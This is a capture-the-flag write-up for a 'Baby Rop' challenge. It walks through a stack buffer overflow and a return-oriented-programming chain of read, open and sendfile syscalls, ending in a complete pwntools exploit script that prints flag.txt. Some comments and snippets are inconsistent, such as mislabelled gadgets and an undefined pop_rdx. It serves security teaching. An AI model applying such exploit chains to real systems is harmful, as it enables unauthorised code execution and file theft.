# Pwn - Baby Rop
- Solved by: @Elma
- Flag: **-UNKNOWN-**

## Writeup

We start by looking at the protections of the binary.

```sh
> checksec baby_rop
[*] './baby_rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Throwing the binary into IDA, the vulnerability is straightforward.

```c
int vuln()
{
  char input[112];
  return fgets(input, 256, stdin);
}
```

If you haven't, you should read the writeup on Baby Binary. This challenge is essentially a sequel. The code and the vulnerability is the same, but the **No eXecute (NX)** protections are set. This means that we can't simply write shellcode and send it in like we did before.

In order to do get a similar outcome of reading the flag, we have to use this exploit technique known as the **Return Oriented Programming (ROP)**.

## Return Oriented Programming

From our vulnerability, we are able to overwrite the return address to redirect the flow of the program when the program attempts to return. How this works is that we put an address that we want to call at our return address, and **at the time that it calls return, the address will be at the top of the stack (pointed by RSP)** and will be popped into the instruction pointer **(RIP)**.

Previously, we would write our own assembly code that will read the flag file, however we are unable to do that now since we are unable to put our shellcode in an any executable memory trivially. There is also no single `win` function that we can call to give us the flag. As such, we will have to **reuse code snippets that already exists within the program** and chain them using a **ret** instruction in order to read the flag.

## Crafting ROP chain

### Finding Gadgets

We will write a ROP chain that does the `open("flag.txt", 0, 0)` and `sendfile(out_fd=1, in_fd=3, offset=0, count=large integer)`. What this will do is that the `open` syscall will open the `flag` file at the file descriptor `3`, and then `sendfile` will read the contents of the flag file to stdout.

Reference [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) to see the syscalls that we can do and the parameters that has to be set.

> the reserved file descriptors in linux are 0, 1 and 2. 
> **stdin = 0**
> **stdout = 1**
> **stderr = 2**
> subsequently created file descriptors will be in consecutive order. thus if we open **flag**, it will have a file descriptor of 3.

In order to find our ROP gadgets in order to craft our ROP chain, we can use the `ropper` tool.

Here are some of the useful gadgets that I have found

```py
pop_rax = 0x0000000000449027 # pop rax ; ret
pop_rdx_rbx = 0x000000000047f0eb # pop rdx ; pop rbx ; ret
pop_rsi = 0x0000000000409f7e # pop rsi ; ret
pop_rdi = 0x0000000000401f0f # pop rdi ; ret
syscall = 0x0000000000414b16 # syscall ; ret
```

### Making Syscalls

#### Part 1: Read Syscall

The first syscall we want to make is to write the string `flag.txt` into a known address. If we do `vmmap` in GDB, we can see the memory pages and their corresponding permissions

```c
gef> vmmap
Start              End                Size               Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000001000 0x0000000000000000 r-- ./baby_rop
0x0000000000401000 0x0000000000498000 0x0000000000097000 0x0000000000001000 r-x ./baby_rop  <-  $rcx, $rip
0x0000000000498000 0x00000000004c1000 0x0000000000029000 0x0000000000098000 r-- ./baby_rop
0x00000000004c1000 0x00000000004c5000 0x0000000000004000 0x00000000000c0000 r-- ./baby_rop
0x00000000004c5000 0x00000000004c8000 0x0000000000003000 0x00000000000c4000 rw- ./baby_rop  <-  $rbx, $rbp, $rsi, $r12
0x00000000004c8000 0x00000000004ef000 0x0000000000027000 0x0000000000000000 rw- [heap]<tls-th1>
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000004000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $rsp
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
```

As we can see `0x4c5000` is an address within our binary, and has writeable permissions. Next we will examine the memory there and find an empty-looking location to store our string. This can be **ANY** address that looks like it has nothing important. For my own purpose, I chose `0x0000004c63b0`.

Our first ROP chain does a `read(fd=0, buf=0x4c63b0, size=0x8)` syscall to write our `flag.txt` string into that address for use later on.

Following the syscall table page that I referenced earlier, we will need to set **RAX**, **RDI**, **RSI**, **RDX**.

```py
p1  = p64(pop_rax) + p64(0x0)                   # syscall_num = 0 (read)
p1 += p64(pop_rdi) + p64(0x0)                   # fd = stdin
p1 += p64(pop_rsi) + p64(0x4c63b0)              # buf = 0x4c63b0
p1 += p64(pop_rdx_rbx) + p64(0x8) + p64(0x0)    # size = 0x8, RBX is junk
p1 += p64(syscall)                              # read "flag.txt" into .bss
p1 += p64(elf.sym.vuln)                         # loop back to vuln for second round of ROP chain since our input is not long enough to squeeze everything into one
```


#### Part 2: Open Syscall

```py
p2  = p64(pop_rax) + p64(0x2)           # syscall num = 2 (open)
p2 += p64(pop_rdi) + p64(0x4c63b0)      # fname = 0x4c63b0 
p2 += p64(pop_rsi) + p64(0x0)           # flags = 0 (open)
p2 += p64(pop_rdx_rbx) + p64(0x0) * 2   # mode = 0 (open)
p2 += p64(syscall)                      # open file and get new file descriptor for flag.txt
p2 += p64(elf.sym.vuln)                 # loop back to vuln for final rop chain
```

#### Part 3: Sendfile flag from flag.txt to stdout

```py
p3  = p64(pop_rax) + p64(40)            # syscall_num = 40 (sendfile)
p3 += p64(pop_rdi) + p64(1)             # out_fd = stdout (1)
p3 += p64(pop_rsi) + p64(3)             # in_fd = stdout (3)
p3 += p64(pop_rdx) + p64(0)             # offset = 0
p3 += p64(syscall)                      # write flag to stdout
```

#### Final Script

```py
from pwn import *
context.binary = elf = ELF("./baby_rop")

p = process("./baby_rop")

pop_rax = 0x449027 # pop rax ; ret
pop_rdx_rbx = 0x47f0eb # pop rax ; ret
pop_rsi = 0x409f7e # pop rax ; ret
pop_rdi = 0x401f0f # pop rax ; ret
syscall = 0x414b16

#### Part 1: Read Syscall

p1 = b"A"*120
p1 += p64(pop_rax) + p64(0x0)                   # syscall_num = 0 (read)
p1 += p64(pop_rdi) + p64(0x0)                   # fd = stdin
p1 += p64(pop_rsi) + p64(0x4c63b0)              # buf = 0x4c63b0
p1 += p64(pop_rdx_rbx) + p64(0x8) + p64(0x0)    # size = 0x8, RBX is junk
p1 += p64(syscall)                              # read "flag.txt" into .bss
p1 += p64(elf.sym.vuln)                         # loop back to vuln for second round of ROP chain since our input is not long enough to squeeze everything into one

#### Part 2: Open Syscall

p2 = b"A"*120
p2 += p64(pop_rax) + p64(0x2)           # syscall num = 2 (open)
p2 += p64(pop_rdi) + p64(0x4c63b0)      # fname = 0x4c63b0
p2 += p64(pop_rsi) + p64(0x0)           # flags = 0 (open)
p2 += p64(pop_rdx_rbx) + p64(0x0) * 2   # mode = 0 (open)
p2 += p64(syscall)                      # open file and get new file descriptor for flag.txt
p2 += p64(elf.sym.vuln)                 # loop back to vuln for final rop chain

#### Part 3: Sendfile flag from flag.txt to stdout

p3 = b"A"*120
p3 += p64(pop_rax) + p64(40)            # syscall_num = 40 (sendfile)
p3 += p64(pop_rdi) + p64(1)             # out_fd = stdout (1)
p3 += p64(pop_rsi) + p64(3)             # in_fd = stdout (3)
p3 += p64(pop_rdx_rbx) + p64(0) * 2     # offset = 0
p3 += p64(syscall)                      # write flag to stdout

gdb.attach(p)
p.sendline(p1)
p.send(b"flag.txt")

p.sendline(p2)

p.sendline(p3)

p.interactive()
```

_note: i didn't set the last paramter to sendfile syscall, which is size. this is because as long as the size is a sufficiently large number, it does not matter. and it was too hard to find a working gadget to set r10 so i just let it be. thankfully it was a nice number of 0x80 here._
